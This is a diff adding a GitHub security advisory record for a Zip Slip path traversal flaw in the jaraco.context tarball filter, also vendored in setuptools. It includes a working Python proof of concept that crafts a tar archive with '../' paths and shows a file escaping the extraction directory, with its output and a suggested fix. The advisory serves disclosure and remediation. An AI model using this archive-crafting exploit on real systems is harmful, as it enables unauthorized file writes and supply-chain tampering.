@@ -1,0 +1,68 @@
+{
+  "id": "GHSA-58pv-8j8x-9vj2",
+  "modified": "2026-01-21T16:20:45.121974Z",
+  "published": "2026-01-13T21:48:17Z",
+  "aliases": [
+    "CVE-2026-23949"
+  ],
+  "summary": "jaraco.context Has a Path Traversal Vulnerability",
+  "details": "### Summary\nThere is a Zip Slip path traversal vulnerability in the jaraco.context package affecting setuptools as well, in `jaraco.context.tarball()` function. The vulnerability may allow attackers to extract files outside the intended extraction directory when malicious tar archives are processed.\nThe strip_first_component filter splits the path on the first `/` and extracts the second component, while allowing `../` sequences. Paths like `dummy_dir/../../etc/passwd` become `../../etc/passwd`.\nNote that this suffers from a nested tarball attack as well with multi-level tar files such as `dummy_dir/inner.tar.gz`, where the inner.tar.gz includes a traversal `dummy_dir/../../config/.env` that also gets translated to `../../config/.env`.\n\nThe code can be found:\n- https://github.com/jaraco/jaraco.context/blob/main/jaraco/context/__init__.py#L74-L91\n- https://github.com/pypa/setuptools/blob/main/setuptools/_vendor/jaraco/context.py#L55-L76 (inherited)\n\nThis report was also sent to setuptools maintainers and they asked some questions regarding this.\n\nThe lengthy answer is:\n\nThe vulnerability seems to be the `strip_first_component` filter function, not the tarball function itself and has the same behavior on any tested Python version locally (from 11 to 14, as I noticed that there is a backports conditional for the tarball).\nThe stock tarball for Python 3.12+ is considered not vulnerable (until proven otherwise 😄) but here the custom filter seems to overwrite the native filtering and introduces the issue - while overwriting the updated secure Python 3.12+ behavior and giving a false sense of sanitization.\n\nThe short answer is:\n\nIf we are talking about Python \u003c 3.12 the tarball and jaraco implementations /  behaviors are relatively the same but for Python 3.12+ the jaraco implementation overwrites the native tarball protection.\n\nSampled tests:\n\u003cimg width=\"1634\" height=\"245\" alt=\"image\" src=\"https://github.com/user-attachments/assets/ce6c0de6-bb53-4c2b-818a-d77e28d2fbeb\" /\u003e\n\n### Details\n\nThe flow with setuptools in the mix:\n```\nsetuptools._vendor.jaraco.context.tarball() \u003e req = urlopen(url) \u003e with tarfile.open(fileobj=req, mode='r|*') as tf: \u003e tf.extractall(path=target_dir, filter=strip_first_component) \u003e strip_first_component (Vulnerable)\n```\n\n### PoC\n\nThis was tested on multiple Python versions \u003e 11 on a Debian GNU 12 (bookworm).\nYou can run this directly after having all the dependencies:\n```py\n#!/usr/bin/env python3\nimport tarfile\nimport io\nimport os\nimport sys\nimport shutil\nimport tempfile\nfrom setuptools._vendor.jaraco.context import strip_first_component\n\n\ndef create_malicious_tarball():\n    tar_data = io.BytesIO()\n    with tarfile.open(fileobj=tar_data, mode='w') as tar:\n        # Create a malicious file path with traversal sequences\n        malicious_files = [\n            # Attempt 1: Simple traversal to /tmp\n            {\n                'path': 'dummy_dir/../../tmp/pwned_by_zipslip.txt',\n                'content': b'[ZIPSLIP] File written to /tmp via path traversal!',\n                'name': 'pwned_via_tmp'\n            },\n            # Attempt 2: Try to write to home directory\n            {\n                'path': 'dummy_dir/../../../../home/pwned_home.txt',\n                'content': b'[ZIPSLIP] Attempted write to home directory',\n                'name': 'pwned_via_home'\n            },\n            # Attempt 3: Try to write to current directory parent\n            {\n                'path': 'dummy_dir/../escaped.txt',\n                'content': b'[ZIPSLIP] File in parent directory!',\n                'name': 'pwned_escaped'\n            },\n            # Attempt 4: Legitimate file for comparison\n            {\n                'path': 'dummy_dir/legitimate_file.txt',\n                'content': b'This file stays in target directory',\n                'name': 'legitimate'\n            }\n        ]\n        for file_info in malicious_files:\n            content = file_info['content']\n            tarinfo = tarfile.TarInfo(name=file_info['path'])\n            tarinfo.size = len(content)\n            tar.addfile(tarinfo, io.BytesIO(content))\n\n    tar_data.seek(0)\n    return tar_data\n\n\ndef exploit_zipslip():\n    print(\"[*] Target: setuptools._vendor.jaraco.context.tarball()\")\n\n    # Create temporary directory for extraction\n    temp_base = tempfile.mkdtemp(prefix=\"zipslip_test_\")\n    target_dir = os.path.join(temp_base, \"extraction_target\")\n\n    try:\n        os.mkdir(target_dir)\n        print(f\"[+] Created target extraction directory: {target_dir}\")\n\n        # Create malicious tarball\n        print(\"[*] Creating malicious tar archive...\")\n        tar_data = create_malicious_tarball()\n\n        try:\n            with tarfile.open(fileobj=tar_data, mode='r') as tf:\n                for member in tf:\n                    # Apply the ACTUAL vulnerable function from setuptools\n                    processed_member = strip_first_component(member, target_dir)\n                    print(f\"[*] Extracting: {member.name:40} -\u003e {processed_member.name}\")\n                    \n                    # Extract to target directory\n                    try:\n                        tf.extract(processed_member, path=target_dir)\n                        print(f\"    ✓ Extracted successfully\")\n                    except (PermissionError, FileNotFoundError) as e:\n                        print(f\"    ! {type(e).__name__}: Path traversal ATTEMPTED\")\n        except Exception as e:\n            print(f\"[!] Extraction raised exception: {type(e).__name__}: {e}\")\n        \n        # Check results\n        print(\"[*] Checking for extracted files...\")\n\n        # Check target directory\n        print(f\"[*] Files in target directory ({target_dir}):\")\n        if os.path.exists(target_dir):\n            for root, _, files in os.walk(target_dir):\n                level = root.replace(target_dir, '').count(os.sep)\n                indent = ' ' * 2 * level\n                print(f\"{indent}{os.path.basename(root)}/\")\n                subindent = ' ' * 2 * (level + 1)\n                for file in files:\n                    filepath = os.path.join(root, file)\n                    try:\n                        with open(filepath, 'r') as f:\n                            content = f.read()[:50]\n                        print(f\"{subindent}{file}\")\n                        print(f\"{subindent}  └─ {content}...\")\n                    except:\n                        print(f\"{subindent}{file} (binary)\")\n        else:\n            print(f\"[!] Target directory not found!\")\n        \n        print()\n        print(\"[*] Checking for traversal attempts...\")\n        print()\n\n        # Check if files escaped\n        traversal_attempts = [\n            (\"/tmp/pwned_by_zipslip.txt\", \"Escape to /tmp\"),\n            (os.path.expanduser(\"~/pwned_home.txt\"), \"Escape to home\"),\n            (os.path.join(temp_base, \"escaped.txt\"), \"Escape to parent\"),\n        ]\n\n        escaped = False\n        for check_path, description in traversal_attempts:\n            if os.path.exists(check_path):\n                print(f\"[+] Path Traversal Confirmed: {description}\")\n                print(f\"      File created at: {check_path}\")\n                try:\n                    with open(check_path, 'r') as f:\n                        content = f.read()\n                    print(f\"      Content: {content}\")\n                    print(f\"      Removing: {check_path}\")\n                    os.remove(check_path)\n                except Exception as e:\n                    print(f\"      Error reading: {e}\")\n                escaped = True\n            else:\n                print(f\"[-] OK: {description} - No escape detected\")\n\n        if escaped:\n            print(\"[+] EXPLOIT SUCCESSFUL - Path traversal vulnerability confirmed!\")\n        else:\n            print(\"[-] No path traversal detected (mitigation in place)\")\n\n    finally:\n        # Cleanup\n        print()\n        print(f\"[*] Cleaning up: {temp_base}\")\n        try:\n            shutil.rmtree(temp_base)\n        except Exception as e:\n            print(f\"[!] Cleanup error: {e}\")\n\n\ndef check_python_version():\n    print(f\"[+] Python version: {sys.version}\")\n    # Python 3.11.4+ added DEFAULT_FILTER\n    if hasattr(tarfile, 'DEFAULT_FILTER'):\n        print(\"[+] Python has DEFAULT_FILTER (tarfile security hardening)\")\n    else:\n        print(\"[!] Python does not have DEFAULT_FILTER (older version)\")    \n    print()\n\n\nif __name__ == \"__main__\":\n    check_python_version()\n    exploit_zipslip()\n```\n\nOutput:\n```\n[+] Python version: 3.11.2 (main, Apr 28 2025, 14:11:48) [GCC 12.2.0] \n[!] Python does not have DEFAULT_FILTER (older version) \n\n[*] Target: setuptools._vendor.jaraco.context.tarball() \n[+] Created target extraction directory: /tmp/zipslip_test_tnu3qpd5/extraction_target \n[*] Creating malicious tar archive... \n[*] Extracting: ../../tmp/pwned_by_zipslip.txt           -\u003e ../../tmp/pwned_by_zipslip.txt \n    ✓ Extracted successfully \n[*] Extracting: ../../../../home/pwned_home.txt          -\u003e ../../../../home/pwned_home.txt \n    ! PermissionError: Path traversal ATTEMPTED \n[*] Extracting: ../escaped.txt                           -\u003e ../escaped.txt \n    ✓ Extracted successfully \n[*] Extracting: legitimate_file.txt                      -\u003e legitimate_file.txt \n    ✓ Extracted successfully \n[*] Checking for extracted files... \n[*] Files in target directory (/tmp/zipslip_test_tnu3qpd5/extraction_target): \nextraction_target/ \n  legitimate_file.txt \n    └─ This file stays in target directory... \n\n[*] Checking for traversal attempts... \n\n[-] OK: Escape to /tmp - No escape detected \n[-] OK: Escape to home - No escape detected \n[+] Path Traversal Confirmed: Escape to parent \n      File created at: /tmp/zipslip_test_tnu3qpd5/escaped.txt \n      Content: [ZIPSLIP] File in parent directory! \n      Removing: /tmp/zipslip_test_tnu3qpd5/escaped.txt \n[+] EXPLOIT SUCCESSFUL - Path traversal vulnerability confirmed! \n\n[*] Cleaning up: /tmp/zipslip_test_tnu3qpd5\n```\n\n### Impact\n\n- Arbitrary file creation in filesystem (HIGH exploitability) - especially if popular packages download tar files remotely and use this package to extract files.\n- Privesc (LOW exploitability)\n- Supply-Chain attack (VARIABLE exploitability) - relevant to the first point.\n\n### Remediation\n\nI guess removing the custom filter is not feasible given the backward compatibility issues that might come up you can use a safer filter `strip_first_component` that skips or sanitizes `../` character sequences since it is already there eg.\n```\nif member.name.startswith('/') or '..' in member.name:\n  raise ValueError(f\"Attempted path traversal detected: {member.name}\")\n```",
+  "affected": [
+    {
+      "package": {
+        "ecosystem": "PyPI",
+        "name": "jaraco-context",
+        "purl": "pkg:pypi/jaraco-context"
+      },
+      "ranges": [
+        {
+          "type": "ECOSYSTEM",
+          "events": [
+            {
+              "introduced": "5.2.0"
+            },
+            {
+              "fixed": "6.1.0"
+            }
+          ]
+        }
+      ],
+      "versions": [
+        "5.2.0",
+        "5.3.0",
+        "6.0.0",
+        "6.0.1",
+        "6.0.2"
+      ],
+      "database_specific": {
+        "source": "https://github.com/github/advisory-database/blob/main/advisories/github-reviewed/2026/01/GHSA-58pv-8j8x-9vj2/GHSA-58pv-8j8x-9vj2.json"
+      }
+    }
+  ],
+  "references": [
+    {
+      "type": "WEB",
+      "url": "https://github.com/jaraco/jaraco.context/security/advisories/GHSA-58pv-8j8x-9vj2"
+    },
+    {
+      "type": "ADVISORY",
+      "url": "https://nvd.nist.gov/vuln/detail/CVE-2026-23949"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/jaraco/jaraco.context/commit/7b26a42b525735e4085d2e994e13802ea339d5f9"
+    },
+    {
+      "type": "PACKAGE",
+      "url": "https://github.com/jaraco/jaraco.context"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/jaraco/jaraco.context/blob/main/jaraco/context/__init__.py#L74-L91"
+    },
+    {
+      "type": "WEB",
+      "url": "https://github.com/pypa/setuptools/blob/main/setuptools/_vendor/jaraco/context.py#L55-L76"
+    }
+  ]
+}
